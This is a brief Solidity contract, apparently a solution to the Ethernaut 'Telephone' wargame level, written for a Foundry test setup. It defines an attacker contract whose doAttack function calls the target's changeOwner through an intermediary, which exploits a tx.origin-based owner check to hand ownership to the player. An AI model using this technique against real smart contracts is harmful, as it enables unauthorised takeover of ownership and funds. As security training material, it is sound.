// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {Telephone} from "../../src/ethernaut/04_Telephone/Telephone.sol";

contract Telephone_Attacker {
	address player;
	Telephone coreInst;
	
	constructor(Telephone coreInst_) payable {
		player = msg.sender;
		coreInst = coreInst_;
	}
	
	receive() external payable {}
	
	function doAttack() public {
		coreInst.changeOwner(player);
	}
}
